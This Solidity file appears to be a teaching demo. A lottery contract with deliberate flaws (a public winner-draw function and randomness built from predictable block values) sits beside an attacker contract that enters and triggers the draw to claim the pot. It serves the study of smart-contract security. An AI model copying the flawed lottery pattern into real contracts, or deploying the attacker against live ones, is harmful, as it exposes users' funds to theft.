// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.19;

contract LogicError {

    address payable[] public participants; //defining array for participants
    uint public lotteryAmt;
    function enterGame() public payable {
        require(msg.value == 1 ether, "Wrong entry fee"); //participants must send exactly 1 Ether
        participants.push(payable(msg.sender)); //if successful, add address to array
    }

function chooseTheWinner() public payable {
    require(participants.length > 0, "No participants in the game"); //must be participants in array
    
    uint winnerIndex = random() % participants.length; //index generation for winner
    participants[winnerIndex].transfer(address(this).balance); //transfer the contract balance to the selected winner
    lotteryAmt++;
}

function random() private view returns (uint) {
    return uint(keccak256(abi.encodePacked(block.basefee, block.timestamp, participants.length))); //generate random pseudo number with block timestamp and participants
 }
}

contract LogicAttacker {
    LogicError public gameError; //store vulnerable contract
    constructor(address _logicErrorAddress) {  //to take vulnerable address as argument for deploying
        gameError = LogicError(_logicErrorAddress);
    }
    function attack() public payable {
        require(msg.value == 1 ether, "Incorrect entry fee");
        gameError.enterGame{value: 1 ether}(); //calls the enterGame function of vulnerable contract with 1 Ether
        gameError.chooseTheWinner(); //calls chooseTheWinner funcion
    }
    receive() external payable {
        gameError.chooseTheWinner(); //fallback to call choseTheWinner to ensure attack success
    }
}